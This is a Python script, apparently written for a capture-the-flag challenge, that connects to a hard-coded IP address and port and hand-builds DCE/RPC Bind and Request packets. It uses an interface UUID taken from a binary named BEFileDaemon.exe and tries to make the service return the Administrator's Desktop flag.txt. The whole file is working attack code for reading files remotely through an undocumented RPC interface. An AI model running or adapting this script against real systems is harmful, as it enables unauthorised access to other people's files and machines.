#!/usr/bin/env python3
"""
简单测试 RPC 端口
"""

import socket
import struct

TARGET = "116.62.114.4"
PORT = 62831

# 从 BEFileDaemon.exe 中提取的 UUID
# 8902e062bd447b49b85fbc340fbcc2b0 -> 62e00289-44bd-497b-b85f-bc340fbcc2b0
UUID_FROM_BINARY = bytes.fromhex('8902e062bd447b49b85fbc340fbcc2b0')

def recv_all(sock, timeout=10):
    """接收所有数据"""
    sock.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            # 检查是否是完整的 RPC 响应
            if len(data) >= 10:
                frag_len = struct.unpack('<H', data[8:10])[0]
                if len(data) >= frag_len:
                    break
    except socket.timeout:
        pass
    return data

# 测试 1: 直接发送随机数据看响应
print("Test 1: Raw connection")
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((TARGET, PORT))
    print(f"Connected to {TARGET}:{PORT}")
    
    # 发送简单的测试数据
    sock.send(b"TEST")
    resp = recv_all(sock, 5)
    print(f"Response to 'TEST': {resp[:100] if resp else 'None'}")
    sock.close()
except Exception as e:
    print(f"Error: {e}")

# 测试 2: DCE/RPC Bind with UUID from binary
print("\nTest 2: RPC Bind with binary UUID")
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(15)
    sock.connect((TARGET, PORT))
    
    # NDR 传输语法
    ndr_syntax = bytes.fromhex('045d888aeb1cc9119fe808002b104860')
    ndr_version = struct.pack('<HH', 2, 0)
    
    # Context item
    ctx_item = struct.pack('<HBB', 0, 1, 0)  # context_id=0, num_items=1, reserved=0
    ctx_item += UUID_FROM_BINARY  # Interface UUID
    ctx_item += struct.pack('<HH', 1, 0)  # interface version 1.0
    ctx_item += ndr_syntax + ndr_version  # transfer syntax
    
    # Bind body
    bind_body = struct.pack('<HH', 0x1000, 0x1000)  # max xmit/recv frag
    bind_body += struct.pack('<I', 0)  # assoc group
    bind_body += struct.pack('<BBH', 1, 0, 0)  # num_ctx_items=1, reserved
    bind_body += ctx_item
    
    # RPC header
    frag_length = 24 + len(bind_body)
    header = struct.pack('<BBBBIHHI',
        5, 0,      # version 5.0
        11,        # bind
        0x03,      # flags: first_frag | last_frag
        0x10,      # data rep: little endian
        frag_length,
        0,         # auth length
        0          # call id
    )
    
    bind_pdu = header + bind_body
    print(f"Sending Bind PDU ({len(bind_pdu)} bytes)")
    print(f"  UUID: {UUID_FROM_BINARY.hex()}")
    print(f"  Hex: {bind_pdu.hex()}")
    
    sock.send(bind_pdu)
    
    resp = recv_all(sock, 15)
    print(f"\nResponse ({len(resp)} bytes)")
    if resp:
        print(f"  Hex: {resp.hex()}")
        if len(resp) >= 3:
            ptype = resp[2]
            ptype_names = {0: 'REQUEST', 2: 'RESPONSE', 11: 'BIND', 12: 'BIND_ACK', 13: 'BIND_NAK', 14: 'ALTER_CONTEXT'}
            print(f"  Packet type: {ptype} ({ptype_names.get(ptype, 'UNKNOWN')})")
            
            if ptype == 12:  # BIND_ACK
                print("  [+] Bind successful!")
                
                # 发送 Request 读取文件
                print("\n  Sending Request to read flag.txt...")
                filepath = "C:\\Users\\Administrator\\Desktop\\flag.txt"
                filepath_bytes = filepath.encode('utf-16-le') + b'\x00\x00'
                
                # 简单 stub data: 路径长度 + 路径
                stub_data = struct.pack('<I', len(filepath) + 1)  # max count
                stub_data += struct.pack('<I', 0)  # offset
                stub_data += struct.pack('<I', len(filepath) + 1)  # actual count
                stub_data += filepath_bytes
                
                # Request header
                alloc_hint = len(stub_data)
                req_header = struct.pack('<IHH', alloc_hint, 0, 0)  # alloc_hint, ctx_id, opnum
                body = req_header + stub_data
                
                # Pad to 8-byte boundary
                pad = (8 - len(body) % 8) % 8
                body += b'\x00' * pad
                
                frag_len = 24 + len(body)
                header = struct.pack('<BBBBIHHI', 5, 0, 0, 0x03, 0x10, frag_len, 0, 1)
                req_pdu = header + body
                
                print(f"  Request PDU ({len(req_pdu)} bytes): {req_pdu.hex()}")
                sock.send(req_pdu)
                
                resp2 = recv_all(sock, 10)
                print(f"\n  Response ({len(resp2)} bytes)")
                if resp2:
                    print(f"    Hex: {resp2.hex()}")
                    if len(resp2) > 24:
                        body = resp2[24:]
                        print(f"    Body: {body}")
                        try:
                            print(f"    As UTF-16: {body.decode('utf-16-le', errors='ignore')}")
                        except:
                            pass
                        try:
                            print(f"    As UTF-8: {body.decode('utf-8', errors='ignore')}")
                        except:
                            pass
                
            elif ptype == 13:  # BIND_NAK
                print("  [-] Bind rejected (NAK)")
                if len(resp) > 24:
                    reason = struct.unpack('<H', resp[24:26])[0] if len(resp) > 25 else 0
                    print(f"  Reject reason: {reason}")
    
    sock.close()
except Exception as e:
    print(f"Error: {e}")
    import traceback
    traceback.print_exc()

# 测试 3: 尝试另一种 UUID 格式
print("\nTest 3: Trying different UUID interpretation")
# UUID 也可能是: 62e00289-44bd-497b-b85f-bc340fbcc2b0 (standard format)
# Bytes: 89 02 e0 62  bd 44  7b 49  b8 5f  bc 34 0f bc c2 b0
UUID_STANDARD = bytes.fromhex('8902e06244bd7b49b85fbc340fbcc2b0')

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(15)
    sock.connect((TARGET, PORT))
    
    ctx_item = struct.pack('<HBB', 0, 1, 0)
    ctx_item += UUID_STANDARD
    ctx_item += struct.pack('<HH', 1, 0)
    ctx_item += bytes.fromhex('045d888aeb1cc9119fe808002b104860') + struct.pack('<HH', 2, 0)
    
    bind_body = struct.pack('<HH', 0x1000, 0x1000)
    bind_body += struct.pack('<I', 0)
    bind_body += struct.pack('<BBH', 1, 0, 0)
    bind_body += ctx_item
    
    frag_length = 24 + len(bind_body)
    header = struct.pack('<BBBBIHHI', 5, 0, 11, 0x03, 0x10, frag_length, 0, 0)
    
    bind_pdu = header + bind_body
    print(f"Sending Bind with UUID: {UUID_STANDARD.hex()}")
    sock.send(bind_pdu)
    
    resp = recv_all(sock, 15)
    print(f"Response ({len(resp)} bytes): {resp.hex() if resp else 'None'}")
    if resp and len(resp) >= 3:
        print(f"Packet type: {resp[2]}")
    
    sock.close()
except Exception as e:
    print(f"Error: {e}")
